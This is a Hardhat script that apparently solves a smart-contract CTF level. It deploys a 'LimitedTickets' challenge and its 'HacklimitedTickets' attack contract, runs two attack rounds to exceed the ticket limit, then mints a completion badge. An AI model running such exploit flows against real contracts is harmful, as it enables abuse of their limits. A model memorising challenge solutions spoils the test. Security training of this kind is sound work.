/* eslint-disable no-plusplus */
/* eslint-disable no-await-in-loop */
/* eslint-disable import/no-extraneous-dependencies */
const hre = require('hardhat');
const { gameFactoryAddress, nftBadgeAddress } = require('./set_contracts');

async function main() {
  const GameFactory = await hre.ethers.getContractFactory('GameFactory');
  const gameFactory = GameFactory.attach(gameFactoryAddress);

  const tx = await gameFactory.deploy(16);
  const receipt = await tx.wait();

  console.log('Deploy transaction receipt:', receipt);

  const deployInstanceEvents = await gameFactory.queryFilter(
    gameFactory.filters.DeployInstance(null, null, null),
    receipt.blockNumber,
    receipt.blockNumber,
  );

  console.log('deployInstanceEvents------------------------', deployInstanceEvents);

  if (deployInstanceEvents.length > 0) {
    deployInstanceEvents.forEach((event, index) => {
      console.log(`Instance ${index + 1} deployed at:`, event.args[0]);
    });
  } else {
    console.error('Instance addresses not found in events');
  }

  const limitedTicketsAddress = deployInstanceEvents[0].args[0];
  const hackLimitedTicketsAddress = deployInstanceEvents[1].args[0];

  const LimitedTickets = await hre.ethers.getContractFactory('LimitedTickets');
  const limitedTicketsContract = LimitedTickets.attach(limitedTicketsAddress);

  const HacklimitedTickets = await hre.ethers.getContractFactory('HacklimitedTickets');
  const hackLimitedTicketsContract = HacklimitedTickets.attach(hackLimitedTicketsAddress);

  const attacker = (await hre.ethers.getSigners())[0].address;
  const ticketAmountPerAttack = 3;
  const attackRounds = 2;
  console.log(attacker);

  for (let i = 0; i < attackRounds; i++) {
    try {
      const txAttack = await hackLimitedTicketsContract.attack(
        limitedTicketsAddress,
        attacker,
        ticketAmountPerAttack,
      );
      const receiptAttack = await txAttack.wait();
      console.log(`Attack round ${i + 1} transaction receipt:`, receiptAttack);
    } catch (error) {
      console.error(`Error in attack round ${i + 1}:`, error.message);
    }
  }

  const ticketCount = await limitedTicketsContract.Count(attacker);
  console.log('Ticket count for attacker after multiple attacks:', ticketCount.toString());

  if (ticketCount > 3) {
    const NFTBadge = await hre.ethers.getContractFactory('NFTbadge');
    const nftBadge = NFTBadge.attach(nftBadgeAddress);

    const [owner] = await hre.ethers.getSigners();
    const balance = await nftBadge.balanceOf(owner.address, 16);

    if (balance < 1) {
      const txNFTBadge = await nftBadge.mint(16, limitedTicketsAddress);
      const receiptNFTBadge = await txNFTBadge.wait();
      console.log('Mint transaction receipt:', receiptNFTBadge);
    }

    const bal = await nftBadge.balanceOf(owner.address, 16);
    console.log('Balance of token ID 16 for owner:', bal.toString());
  } else {
    console.log('Ticket count did not exceed the limit; minting conditions not met.');
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
